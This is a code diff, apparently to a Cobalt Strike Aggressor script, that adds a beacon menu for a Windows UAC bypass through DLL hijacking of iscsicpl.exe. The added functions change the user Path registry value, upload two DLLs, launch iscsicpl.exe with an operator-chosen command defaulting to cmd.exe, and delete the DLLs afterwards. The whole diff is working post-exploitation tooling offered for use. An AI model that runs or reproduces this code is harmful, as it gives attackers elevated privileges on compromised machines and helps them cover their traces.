@@ -24,6 +24,54 @@ sub combypassuac{
 	}
 }
 
+sub iscsicplexebypassuac_{
+	foreach $id ($bid){
+		bshell($id, "reg add HKEY_CURRENT_USER\\Environment /v Path /d $3['Path'] /F");
+		bcd($id, $3['Path']);
+		bupload($id, script_resource("dll/x86/iscsiexe.dll"));
+		bupload($id, script_resource("dll/x86/iscsiexe_org.dll"));
+	}
+}
+
+sub iscsicplexebypassuac{
+	$dialog = dialog("iscsicpl.exe ByPassUac", %(Path => "C:\\Users\\Public", bid => $bid), &iscsicplexebypassuac_);
+	dialog_description($dialog, "c:\\Windows\\syswow64\\iscsicpl.exe缺少iscsiexe.dll和iscsiexe_org.dll");
+	drow_text($dialog, "Path", "Path:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
+
+sub iscsicplexebypassuacrun{
+	foreach $id ($bid){
+		bshell($id, "c:\\windows\\syswow64\\iscsicpl.exe c=$3['Command']");
+	}
+}
+
+sub iscsicplexebypassuacdel_{
+	foreach $id ($bid){
+		bcd($id, $3['Path']);
+		brm($id, "$3['Path']\\iscsiexe.dll");
+		brm($id, "$3['Path']\\iscsiexe_org.dll");
+	}
+
+}
+
+sub iscsicplexebypassuac2{
+	$dialog = dialog("iscsicpl.exe ByPassUac", %(Command => "C:\\Windows\\System32\\cmd.exe", bid => $bid), &iscsicplexebypassuacrun);
+	dialog_description($dialog, "c:\\windows\\syswow64\\iscsicpl.exe c=<command>");
+	drow_text($dialog, "Command", "Command:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
+
+sub iscsicplexebypassuacdel{
+	$dialog = dialog("iscsicpl.exe ByPassUac", %(Path => "C:\\Users\\Public", bid => $bid), &iscsicplexebypassuacdel_);
+	dialog_description($dialog, "删除上传的DLL");
+	drow_text($dialog, "Path", "Path:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
+
 
 popup beacon_bottom{
 	menu "&bypassuac"{
@@ -31,6 +79,25 @@ popup beacon_bottom{
 			$bid = $1;
 			combypassuac($bid);
 		}
+		
+		menu "&iscsicpl.exe ByPassUac"{
+			item "&上传dll和修改注册表"{
+				$bid = $1;
+				iscsicplexebypassuac($bid);
+			}
+			
+			item "&冲冲冲"{
+				$bid = $1;
+				iscsicplexebypassuac2($bid);
+			}
+			
+			item "&删除dll"{
+				$bid = $1;
+				iscsicplexebypassuacdel($bid);
+			}
+		}
 	}
 
 }
+
+
